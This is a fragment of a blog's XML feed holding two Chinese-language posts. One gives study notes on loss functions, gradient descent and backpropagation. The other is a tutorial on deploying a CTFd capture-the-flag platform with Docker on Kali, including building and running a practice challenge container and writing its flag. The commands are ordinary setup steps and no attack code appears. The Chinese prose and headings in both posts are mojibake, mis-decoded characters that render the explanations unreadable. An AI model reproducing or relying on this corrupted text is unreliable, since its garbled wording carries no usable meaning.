title="å‡æ–¹è¯¯å·®"></a>å‡æ–¹è¯¯å·®</h3><p>$$<br>E=\frac{1}{2}\Sigma_k(y_k-t_k)^2<br>$$</p><p>è¿™é‡Œy_kè¡¨ç¤ºç¥ç»ç½‘ç»œçš„è¾“å‡ºï¼Œt_kè¡¨ç¤ºç›‘ç£æ•°æ®ï¼Œkè¡¨ç¤ºæ•°æ®ç»´æ•°</p><h3 id="äº¤å‰ç†µè¯¯å·®"><a href="#äº¤å‰ç†µè¯¯å·®" class="headerlink" title="äº¤å‰ç†µè¯¯å·®"></a>äº¤å‰ç†µè¯¯å·®</h3><p>$$<br>E=-\Sigma_kt_k\log{y_k}<br>$$</p><h3 id="æŸå¤±å‡½æ•°çš„æ„ä¹‰"><a href="#æŸå¤±å‡½æ•°çš„æ„ä¹‰" class="headerlink" title="æŸå¤±å‡½æ•°çš„æ„ä¹‰"></a>æŸå¤±å‡½æ•°çš„æ„ä¹‰</h3><p>ä¸ªäººè®¤ä¸ºï¼ŒæŸå¤±å‡½æ•°å­˜åœ¨çš„æ„ä¹‰æ˜¯ä½œä¸ºæ¨¡å‹è°ƒå‚ç»“æœçš„é‡è¦æŒ‡æ ‡ï¼Œç”±äºæµ‹è¯•ç²¾åº¦çš„å˜åŒ–æ˜¯ä¸è¿ç»­çš„ï¼ˆå› ä¸ºæµ‹è¯•æ•°æ®æœ‰é™ï¼Œæµ‹è¯•ç»“æœçš„ç²¾åº¦å°±å–å†³äºæµ‹è¯•æ•°æ®çš„å¤šå°‘ï¼‰ï¼Œæ•…æ— æ³•ä½“ç°æ¨¡å‹è°ƒå‚åå¾®å°çš„å˜åŒ–ï¼Œè€ŒæŸå¤±å‡½æ•°æ˜¯è¿ç»­çš„ï¼Œä»»ä½•å¾®å°çš„æ”¹åŠ¨éƒ½å¯èƒ½æ”¹å˜æŸå¤±å‡½æ•°çš„ç»“æœï¼ˆå¯ä»¥è®¤ä¸ºæŸå¤±å‡½æ•°çš„ç²¾åº¦æ¯”æµ‹è¯•ç»“æœçš„ç²¾åº¦é«˜å¾—å¤šï¼‰ï¼Œæ•…éœ€è¦æŸå¤±å‡½æ•°æ¥è¡¡é‡è°ƒå‚åçš„ç»“æœ</p><h3 id="æ•°å€¼å¾®åˆ†"><a href="#æ•°å€¼å¾®åˆ†" class="headerlink" title="æ•°å€¼å¾®åˆ†"></a>æ•°å€¼å¾®åˆ†</h3><blockquote><p>åˆ©ç”¨æŸä¸ªç»™å®šçš„å¾®å°å€¼çš„å·®åˆ†æ±‚å¯¼æ•°çš„è¿‡ç¨‹ï¼Œç§°ä¸ºæ•°å€¼å¾®åˆ†</p></blockquote><ul><li><p>å¯¼æ•°ä¸åå¯¼æ•°çš„å®šä¹‰</p></li><li><p>æ¢¯åº¦åŠæ¢¯åº¦æ³•</p><blockquote><p><strong>æ¢¯åº¦æ³•</strong>ï¼šå‡½æ•°çš„å–å€¼ä»å½“å‰ä½ç½®æ²¿ç€æ¢¯åº¦æ–¹å‘å‰è¿›ä¸€æ®µè·ç¦»ï¼Œç„¶ååœ¨æ–°çš„åœ°æ–¹é‡æ–°æ±‚æ¢¯åº¦ï¼Œå†æ²¿ç€æ–°æ¢¯åº¦æ–¹å‘å‰è¿›ï¼Œé€æ¸å‡å°å‡½æ•°å€¼</p></blockquote></li></ul><h3 id="å­¦ä¹ ç®—æ³•ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰çš„å®ç°"><a href="#å­¦ä¹ ç®—æ³•ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰çš„å®ç°" class="headerlink" title="å­¦ä¹ ç®—æ³•ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰çš„å®ç°"></a>å­¦ä¹ ç®—æ³•ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰çš„å®ç°</h3><p>ç¥ç»ç½‘ç»œçš„å­¦ä¹ æ­¥éª¤ï¼š</p><ul><li><p>å‰æ</p><p>ç¥ç»ç½‘ç»œå­˜åœ¨åˆé€‚çš„æƒé‡å’Œåç½®ï¼Œè°ƒæ•´æƒé‡å’Œåç½®ä»¥ä¾¿æ‹Ÿåˆè®­ç»ƒæ•°æ®çš„è¿‡ç¨‹ç§°ä¸ºâ€œå­¦ä¹ â€</p></li><li><p>æ­¥éª¤1ï¼ˆmini-batchï¼‰</p><p>ä»è®­ç»ƒæ•°æ®ä¸­éšæœºé€‰å‡ºä¸€éƒ¨åˆ†æ•°æ®ï¼Œè¿™éƒ¨åˆ†æ•°æ®ç§°ä¸ºmini-batchã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‡å°mini-batchçš„æŸå¤±å‡½æ•°çš„å€¼</p></li><li><p>æ­¥éª¤2ï¼ˆè®¡ç®—æ¢¯åº¦ï¼‰</p><p>ä¸ºäº†å‡å°mini-batchçš„æŸå¤±å‡½æ•°çš„å€¼ï¼Œéœ€è¦æ±‚å‡ºå„ä¸ªæƒé‡å‚æ•°çš„æ¢¯åº¦ã€‚æ¢¯åº¦è¡¨ç¤ºæŸå¤±å‡½æ•°çš„å€¼å‡å°æœ€å¤šçš„æ–¹å‘</p></li><li><p>æ­¥éª¤3ï¼ˆæ›´æ–°å‚æ•°ï¼‰</p><p>å°†æƒé‡å‚æ•°æ²¿æ¢¯åº¦æ–¹å‘è¿›è¡Œå¾®å°æ›´æ–°</p></li><li><p>æ­¥éª¤4ï¼ˆé‡å¤ï¼‰</p><p>é‡å¤æ­¥éª¤1ã€æ­¥éª¤2ã€æ­¥éª¤3</p></li></ul><blockquote><p><strong>epoch</strong>ï¼š epochæ˜¯ä¸€ä¸ªå•ä½ï¼Œä¸€ä¸ªepochè¡¨ç¤ºå­¦ä¹ ä¸­æ‰€æœ‰è®­ç»ƒæ•°æ®å‡è¢«ä½¿ç”¨è¿‡ä¸€æ¬¡æ—¶çš„æ›´æ–°æ¬¡æ•°</p></blockquote><h2 id="è¯¯å·®æ–¹å‘ä¼ æ’­æ³•"><a href="#è¯¯å·®æ–¹å‘ä¼ æ’­æ³•" class="headerlink" title="è¯¯å·®æ–¹å‘ä¼ æ’­æ³•"></a>è¯¯å·®æ–¹å‘ä¼ æ’­æ³•</h2><h3 id="è®¡ç®—å›¾"><a href="#è®¡ç®—å›¾" class="headerlink" title="è®¡ç®—å›¾"></a>è®¡ç®—å›¾</h3><p>äº†è§£æ­£å‘ä¼ æ’­ã€åå‘ä¼ æ’­åŠå±€éƒ¨è®¡ç®—çš„å®šä¹‰</p><h3 id="é“¾å¼æ³•åˆ™"><a href="#é“¾å¼æ³•åˆ™" class="headerlink" title="é“¾å¼æ³•åˆ™"></a>é“¾å¼æ³•åˆ™</h3><p>å¤åˆå‡½æ•°å¯¼æ•°çš„å®šä¹‰</p><blockquote><p>å¦‚æœæŸä¸ªå‡½æ•°ç”±å¤åˆå‡½æ•°è¡¨ç¤ºï¼Œåˆ™è¯¥å¤åˆå‡½æ•°çš„å¯¼æ•°å¯ä»¥ç”¨æ„æˆå¤åˆå‡½æ•°çš„å„ä¸ªå‡½æ•°çš„å¯¼æ•°çš„ä¹˜ç§¯è¡¨ç¤º</p></blockquote><p>é“¾å¼æ³•åˆ™æ˜¯å…³äºå¤åˆå‡½æ•°çš„å¯¼æ•°çš„æ€§è´¨</p><h3 id="åå‘ä¼ æ’­"><a href="#åå‘ä¼ æ’­" class="headerlink" title="åå‘ä¼ æ’­"></a>åå‘ä¼ æ’­</h3><p>åå‘ä¼ æ’­çš„è®¡ç®—é¡ºåº</p><blockquote><p>å…ˆå°†èŠ‚ç‚¹çš„è¾“å…¥ä¿¡å·ä¹˜ä»¥èŠ‚ç‚¹çš„å±€éƒ¨å¯¼æ•°ï¼ˆåå¯¼æ•°ï¼‰ï¼Œç„¶åä¼ é€’ç»™ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</p></blockquote><ul><li>åŠ æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­</li></ul><p>åŠ æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­åªä¹˜ä»¥1</p><ul><li>ä¹˜æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­</li></ul><p>ä¹˜æ³•èŠ‚ç‚¹çš„åå‘ä¼ æ’­ä¼šå°†ä¸Šæ¸¸çš„å€¼ä¹˜ä»¥æ­£å‘ä¼ æ’­æ—¶çš„è¾“å…¥ä¿¡å·çš„â€œç¿»è½¬å€¼â€åä¼ é€’ç»™ä¸‹æ¸¸</p><p>å¯¹ç¿»è½¬å€¼çš„ç†è§£ï¼šä¹¦ä¸Šè¯´çš„æ˜¯â€œè¡¨ç¤ºä¸€ç§ç¿»è½¬å…³ç³»â€ï¼Œä¸ªäººè®¤ä¸ºæ˜¯å‚ä¸è¿ç®—çš„å¦ä¸€ä¸ªå€¼ï¼Œä»¥ä¹˜æ³•ä¸ºä¾‹ï¼šä¹˜æ³•æ¶‰åŠåˆ°ä¸¤ä¸ªå€¼ï¼Œåˆ™ä¼ æ’­åˆ°æŸä¸€ä¸ªæ–¹å‘çš„å€¼ä¸ºä¸Šæ¸¸çš„å€¼ä¹˜ä»¥å‚ä¸è¿ç®—çš„å¦ä¸€ä¸ªå¯¹è±¡çš„å€¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> çŸ¥è¯†è¾“å‡ºã€AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFdæ­å»º</title>
      <link href="2021/11/28/ctf_contest_platform_build/"/>
      <url>2021/11/28/ctf_contest_platform_build/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFæ¯”èµ›å¹³å°æ­å»º"><a href="#CTFæ¯”èµ›å¹³å°æ­å»º" class="headerlink" title="CTFæ¯”èµ›å¹³å°æ­å»º"></a>CTFæ¯”èµ›å¹³å°æ­å»º</h1><a id="more"></a><h2 id="å…‹éš†CTFd"><a href="#å…‹éš†CTFd" class="headerlink" title="å…‹éš†CTFd"></a>å…‹éš†CTFd</h2><p>GitHubï¼š<a href="https://github.com/CTFd/CTFd">https://github.com/CTFd/CTFd</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html]</span><br><span class="line">â””â”€$ sudo git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git                                                128 â¨¯</span><br><span class="line">Cloning into <span class="string">&#x27;CTFd&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 14012, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (869/869), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (555/555), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143</span><br><span class="line">Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (8691/8691), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]</span><br><span class="line">â””â”€$ sudo apt install docker docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]</span><br><span class="line">â””â”€$ docker --version</span><br><span class="line">Docker version 20.10.8+dfsg1, build 3967b7d</span><br><span class="line">                                                                                                         </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]</span><br><span class="line">â””â”€$ docker-compose --version</span><br><span class="line">docker-compose version 1.27.4, build unknown</span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ æ‰§è¡Œæƒé™"><a href="#æ·»åŠ æ‰§è¡Œæƒé™" class="headerlink" title="æ·»åŠ æ‰§è¡Œæƒé™"></a>æ·»åŠ æ‰§è¡Œæƒé™</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]</span><br><span class="line">â””â”€$ sudo chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="åœ¨CTFdæ ¹ç›®å½•ä¸‹å¯åŠ¨docker"><a href="#åœ¨CTFdæ ¹ç›®å½•ä¸‹å¯åŠ¨docker" class="headerlink" title="åœ¨CTFdæ ¹ç›®å½•ä¸‹å¯åŠ¨docker"></a>åœ¨CTFdæ ¹ç›®å½•ä¸‹å¯åŠ¨docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd]</span><br><span class="line">â””â”€$ sudo docker-compose up -d                                                                      130 â¨¯</span><br><span class="line">Creating network <span class="string">&quot;ctfd_internal&quot;</span> with the default driver</span><br><span class="line">Creating network <span class="string">&quot;ctfd_default&quot;</span> with the default driver</span><br><span class="line">Pulling db (mariadb:10.4.12)...</span><br><span class="line">10.4.12: Pulling from library/mariadb</span><br><span class="line">23884877105a: Pull complete</span><br><span class="line">bc38caa0f5b9: Pull complete</span><br><span class="line">2910811b6c42: Pull complete</span><br><span class="line">36505266dcc6: Pull complete</span><br><span class="line">e69dcc78e96e: Pull complete</span><br><span class="line">222f44c5392d: Pull complete</span><br><span class="line">efc64ea97b9c: Pull complete</span><br><span class="line">9912a149de6b: Pull complete</span><br><span class="line">7ef6cf5b5697: Pull complete</span><br><span class="line">8a05be3688e0: Pull complete</span><br><span class="line">c09ffdc1b660: Pull complete</span><br><span class="line">2eb7fe288fc8: Pull complete</span><br><span class="line">b41d1cc4d40f: Pull complete</span><br><span class="line">a92376500910: Pull complete</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šé¦–æ¬¡å¯åŠ¨ç”±äºä¸‹è½½ä¾èµ–ç­‰ä¼šæ¯”è¾ƒæ…¢</p><h2 id="å¹³å°é…ç½®"><a href="#å¹³å°é…ç½®" class="headerlink" title="å¹³å°é…ç½®"></a>å¹³å°é…ç½®</h2><p>æ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥127.0.0.1:8000é…ç½®èµ›äº‹ç›¸å…³ä¿¡æ¯</p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" srcset="data:image/png;base64,666" alt="GFgMuY.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" srcset="data:image/png;base64,666" alt="GFgTJ9.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" srcset="data:image/png;base64,666" alt="GFgWcX.png"></p><h2 id="æ·»åŠ é¢˜ç›®"><a href="#æ·»åŠ é¢˜ç›®" class="headerlink" title="æ·»åŠ é¢˜ç›®"></a>æ·»åŠ é¢˜ç›®</h2><p>åœ¨GitHubä¸Šæ‰¾é¢˜ç›®ï¼Œcloneåˆ°æœ¬åœ°</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">â””â”€$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/CTFTraining.git</span><br><span class="line">Cloning into <span class="string">&#x27;CTFTraining&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 86, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86</span><br><span class="line">Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (48/48), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>å®é™…æµ‹è¯•å‘ç°ä¸èƒ½æŠŠæ‰€æœ‰çš„é¢˜ç›®éƒ½cloneä¸‹æ¥ï¼Œå°±å…ˆè¯•ä¸€é“é¢˜</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">â””â”€$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 â¨¯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 32, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32</span><br><span class="line">Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (3/3), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>docker images å‘½ä»¤æŸ¥çœ‹å·²æœ‰é•œåƒ</p><p>docker build ./ -t [é•œåƒåç§°] å¯åŠ¨Dockerfileæ–‡ä»¶ï¼Œåˆ›å»ºé•œåƒ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">â””â”€$ sudo docker build ./ -t 0ctf_2016_unserialize                     </span><br><span class="line">Sending build context to Docker daemon  1.841MB</span><br><span class="line">Step 1/8 : FROM php:5.6-fpm-alpine</span><br><span class="line">5.6-fpm-alpine: Pulling from library/php</span><br><span class="line">169185f82c45: Pull complete </span><br><span class="line">8ba0d98519aa: Pull complete </span><br><span class="line">75f762bbc102: Pull complete </span><br><span class="line">04f939cd9fe5: Pull complete </span><br><span class="line">5feedbe48aa1: Pull complete </span><br><span class="line">47e0f87348c0: Pull complete </span><br><span class="line">68b7fb9d3c14: Pull complete </span><br><span class="line">7e4b086d6b5d: Pull complete </span><br><span class="line">a15e624700d4: Pull complete </span><br><span class="line">f714654cc532: Pull complete </span><br><span class="line">Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">â””â”€$ sudo docker images                                                                                                                                                        1 â¨¯</span><br><span class="line">REPOSITORY              TAG               IMAGE ID       CREATED          SIZE</span><br><span class="line">0ctf_2016_unserialize   latest            931233916db0   2 minutes ago    333MB</span><br><span class="line">ctfd_ctfd               latest            b36ee26f2439   49 minutes ago   791MB</span><br><span class="line">python                  3.7-slim-buster   cd7d26aa86ac   10 days ago      113MB</span><br><span class="line">nginx                   1.17              9beeba249f3e   18 months ago    127MB</span><br><span class="line">mariadb                 10.4.12           b6184b68d1fd   19 months ago    357MB</span><br><span class="line">redis                   4                 191c4017dcdd   19 months ago    89.3MB</span><br><span class="line">ubuntu                  18.10             9dc19675e327   2 years ago      67.3MB</span><br><span class="line">php                     5.6-fpm-alpine    6feac8f2ef42   2 years ago      54.5MB</span><br><span class="line">php                     5-apache-jessie   d34f09f63596   2 years ago      374MB</span><br></pre></td></tr></table></figure><p>å†é€šè¿‡é•œåƒåˆ›å»ºå®¹å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">â””â”€$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç°æœ‰å®¹å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">â””â”€$ sudo docker ps                                                                   </span><br><span class="line">CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS                                               NAMES</span><br><span class="line">9cae78cf79bc   0ctf_2016_unserialize   <span class="string">&quot;docker-php-entrypoiâ€¦&quot;</span>   5 seconds ago    Up 4 seconds    9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp   0ctf_2016_unserialize</span><br><span class="line">3b3889db12c7   nginx:1.17              <span class="string">&quot;nginx -g &#x27;daemon ofâ€¦&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                   ctfd_nginx_1</span><br><span class="line">7b58b9661715   ctfd_ctfd               <span class="string">&quot;/opt/CTFd/docker-enâ€¦&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp           ctfd_ctfd_1</span><br><span class="line">93e49564bff7   mariadb:10.4.12         <span class="string">&quot;docker-entrypoint.sâ€¦&quot;</span>   57 minutes ago   Up 57 minutes                                                       ctfd_db_1</span><br><span class="line">9f4380eb4639   redis:4                 <span class="string">&quot;docker-entrypoint.sâ€¦&quot;</span>   57 minutes ago   Up 57 minutes</span><br></pre></td></tr></table></figure><p>è®¿é—®127.0.0.1:20000å³å¯è®¿é—®åˆ°åˆšåˆšæ·»åŠ çš„é¢˜ç›®ï¼Œ20000æ˜¯åˆšåˆšæŒ‡å®šçš„ç«¯å£</p><p><a href="https://www.helloimg.com/image/GFrlx9"><img src="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" srcset="data:image/png;base64,666" alt="GFrlx9.png"></a></p><p>æ‰“å¼€é¢˜ç›®å®¹å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t &lt;container&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>ä¸ºé¢˜ç›®æ·»åŠ flagï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">â””â”€$ sudo docker <span class="built_in">exec</span> -i -t 0ctf_2016_unserialize /bin/sh                                                                                                                      1 â¨¯</span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br><span class="line">/var/www/html <span class="comment"># echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt</span></span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    flag.txt      index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨åå°æ·»åŠ é¢˜ç›®åœ°å€ç­‰ä¿¡æ¯<br><img src="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" srcset="data:image/png;base64,666" alt="GFVPrX.png"><br><img src="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" srcset="data:image/png;base64,666" alt="GFVFO9.png"></p><p><a href="https://www.helloimg.com/image/GFVxLn"><img src="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" srcset="data:image/png;base64,666" alt="GFVxLn.png"></a></p><p>åŒç†å¯æ·»åŠ å…¶ä»–é¢˜ç›®</p><h2 id="æ­å»ºä¸­é‡åˆ°çš„é—®é¢˜"><a href="#æ­å»ºä¸­é‡åˆ°çš„é—®é¢˜" class="headerlink" title="æ­å»ºä¸­é‡åˆ°çš„é—®é¢˜"></a>æ­å»ºä¸­é‡åˆ°çš„é—®é¢˜</h2><ul><li>git clone å‘½ä»¤å…‹éš†å¤±è´¥ï¼š</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">â””â”€$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 â¨¯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;</span>: Failed to connect to github.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>ç”±äºç½‘ç»œé—®é¢˜ï¼Œå¯èƒ½éœ€è¦å¤šå…‹éš†å‡ æ¬¡ï¼Œå®åœ¨ä¸è¡Œå¯ä»¥è¯•è¯•æŠŠå‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥</p><ul><li><p>æœ‰äº›é¢˜ç›®å…‹éš†ä¸‹æ¥å¯èƒ½æœ‰é—®é¢˜ï¼Œè¿è¡Œè¿‡ç¨‹ä¸­å¯èƒ½ä¼šæŠ¥é”™ï¼ˆç›®å‰ä»ä¸äº†è§£æ˜¯ä»€ä¹ˆåŸå› ï¼‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]</span><br><span class="line">â””â”€$ sudo docker build ./ -t urlstorage                                                                                                                                        1 â¨¯</span><br><span class="line">Sending build context to Docker daemon  282.6kB</span><br><span class="line">Step 1/7 : FROM ubuntu:18.10</span><br><span class="line">18.10: Pulling from library/ubuntu</span><br><span class="line">8a532469799e: Pull complete </span><br><span class="line">32f4dcec3531: Pull complete </span><br><span class="line">230f0701585e: Pull complete </span><br><span class="line">e01f70622967: Pull complete </span><br><span class="line">Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686c</span><br><span class="line">Status: Downloaded newer image <span 